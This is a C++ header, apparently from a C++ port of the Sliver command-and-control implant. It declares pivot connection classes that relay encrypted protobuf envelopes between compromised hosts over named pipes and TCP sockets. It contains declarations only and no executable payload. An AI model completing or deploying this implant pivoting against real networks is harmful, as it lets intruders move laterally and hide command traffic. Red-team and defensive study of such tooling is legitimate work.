#pragma once
#include <windows.h>
#include "sliver.pb.h"
#include "CipherContext.h"
#include <concurrent_queue.h>
#include <atomic>
#include "Beacon.h"

#define BUFSIZE 512
using namespace transports;
namespace pivots {
	class PivotConn {
	public:
		PivotConn();
		~PivotConn();
		virtual void Start() = 0;
		virtual bool Check() = 0;
		virtual void Stop() = 0;
		virtual sliverpb::Envelope ReadEnvelope(string&) = 0;
		virtual bool WriteEnvelope(const sliverpb::Envelope&, string&) = 0;
		virtual bool peerKeyExchange() = 0;
		virtual string read(string&) = 0;
		virtual bool write(const string&, string&) = 0;
		uint64_t downstreamPeerID;
		crypto::CipherContext ctx;
		shared_ptr<concurrency::concurrent_queue<sliverpb::Envelope>> upstream;
		shared_ptr<concurrency::concurrent_queue<sliverpb::Envelope>> downstream;
		shared_ptr<Beacon> beacon;
		thread t;
		atomic<bool> stop;
		atomic<bool> closed;
	};
	class NamedPipeConn : public PivotConn {
	public:
		void Start() override;
		bool Check() override;
		void Stop() override;
		NamedPipeConn(HANDLE,HANDLE);
		string read(string&) override;
		bool write(const string&, string&) override;
		sliverpb::Envelope ReadEnvelope(string&) override;
		bool WriteEnvelope(const sliverpb::Envelope&, string&) override;
		bool peerKeyExchange() override;
	private:
		HANDLE hRead, hWrite;
	};

	class TCPConn : public PivotConn {
	public:
		void Start() override;
		bool Check() override;
		void Stop() override;
		TCPConn(SOCKET);
		~TCPConn();
		string read(string&) override;
		bool write(const string&, string&) override;
		sliverpb::Envelope ReadEnvelope(string&) override;
		bool WriteEnvelope(const sliverpb::Envelope&, string&) override;
		bool peerKeyExchange() override;
	private:
		SOCKET client_socket;
	};
}